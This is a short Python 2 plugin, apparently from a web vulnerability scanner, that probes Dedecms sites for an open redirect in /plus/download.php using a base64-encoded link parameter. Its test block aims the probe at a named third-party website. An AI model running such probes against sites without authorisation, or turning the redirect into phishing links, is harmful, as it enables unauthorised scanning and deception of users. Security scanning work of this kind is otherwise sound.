#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Dedecms /plus/download.php URL redirect',
	'AUTHOR':'Ario,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':''
}

def Audit(services):
	retinfo = None
	output = ''
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Dedecms':
			output += 'plugin run' + os.linesep
			url = services['url'] + "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D"
			try:
				rqu = requests.get(url)
				if rqu.url == 'http://www.baidu.com':
					retinfo = {'level':'low','content':url}
					output += 'Vula:\t' + url
			except:
				pass
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)